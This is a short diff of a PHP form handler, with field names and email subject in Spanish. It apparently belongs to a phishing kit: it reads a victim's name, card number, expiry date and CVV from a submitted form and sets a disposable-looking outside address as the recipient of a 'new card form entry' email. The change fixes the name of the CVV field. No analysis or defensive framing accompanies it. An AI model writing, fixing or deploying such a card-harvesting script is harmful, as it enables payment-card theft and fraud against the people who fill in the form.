@@ -3,7 +3,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $nombre = $_POST['nombre'];
     $numeroTarjeta = $_POST['numero'];
     $fechaVencimiento = $_POST['expiracion'];
-    $cvv = $_POST['cvv'];
+    $cvv = $_POST['ccv'];
 
     $destinatario = "satev76335@haislot.com";
     $asunto = "Nueva entrada de formulario de tarjeta";
